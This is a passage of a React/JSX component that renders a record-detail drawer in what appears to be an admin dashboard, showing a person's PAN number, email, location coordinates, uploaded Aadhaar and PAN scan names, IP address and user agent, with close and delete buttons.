                    <p className="font-mono font-semibold text-foreground uppercase">{selectedRecord.panNumber || "N/A"}</p>
                  </div>
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Email Address</p>
                    <p className="font-semibold text-foreground truncate">{selectedRecord.email || "N/A"}</p>
                  </div>

                  {/* Existing Location */}
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1 col-span-2">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider flex items-center gap-1">
                      <MapPin className="h-3.5 w-3.5 text-amber-500" /> Existing Location Coordinates
                    </p>
                    <p className="font-mono font-semibold text-foreground">{selectedRecord.existingLocation || "N/A"}</p>
                  </div>

                  {/* Application Address */}
                  {selectedRecord.customAddress && (
                    <div className="bg-background border border-border rounded-lg p-3 space-y-1 col-span-2">
                      <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Application Address</p>
                      <p className="font-medium text-foreground leading-relaxed">{selectedRecord.customAddress}</p>
                    </div>
                  )}

                  {/* Document uploads */}
                  <div className="bg-background border border-border rounded-lg p-3 space-y-2 col-span-2">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Uploaded Documents</p>
                    <div className="grid grid-cols-2 gap-2">
                      <div className="space-y-0.5">
                        <p className="text-[9px] uppercase font-bold text-orange-500 tracking-wider">Aadhaar Scan</p>
                        <p className="font-mono text-xs font-semibold text-foreground">{selectedRecord.aadhaarDocName || <span className="text-muted-foreground italic">Not uploaded</span>}</p>
                        {selectedRecord.aadhaarDocSize && <p className="text-[9px] text-muted-foreground">{selectedRecord.aadhaarDocSize}</p>}
                      </div>
                      <div className="space-y-0.5">
                        <p className="text-[9px] uppercase font-bold text-blue-500 tracking-wider">PAN Scan</p>
                        <p className="font-mono text-xs font-semibold text-foreground">{selectedRecord.panDocName || <span className="text-muted-foreground italic">Not uploaded</span>}</p>
                        {selectedRecord.panDocSize && <p className="text-[9px] text-muted-foreground">{selectedRecord.panDocSize}</p>}
                      </div>
                    </div>
                  </div>
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1 col-span-2">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider flex items-center gap-1">
                      <Globe className="h-3.5 w-3.5 text-indigo-500" /> Network IP Address
                    </p>
                    <p className="font-mono text-foreground">{selectedRecord.ipAddress || "127.0.0.1"}</p>
                  </div>
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1 col-span-2">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Browser User Agent</p>
                    <p className="font-mono text-[10px] text-foreground leading-normal break-all">
                      {selectedRecord.userAgent || "Unknown Browser / Audited Client"}
                    </p>
                  </div>
                </div>
              </div>
            )}

            <DrawerFooter className="px-0 flex flex-row gap-3">
              <Button
                variant="outline"
                onClick={() => { setSelectedRecord(null); setIsFlipped(false); setShowFullAadhaar(false); }}
                className="flex-1 border-border hover:bg-muted/50 cursor-pointer text-foreground"
              >
                Close Drawer
              </Button>
              {selectedRecord && (
                <Button
                  variant="destructive"
                  onClick={() => handleDelete(selectedRecord.id)}
                  className="cursor-pointer"
                >
                  Delete Record
                </Button>
              )}
            </DrawerFooter>
          </div>
        </DrawerContent>
      </Drawer>
    </div>
  )
}
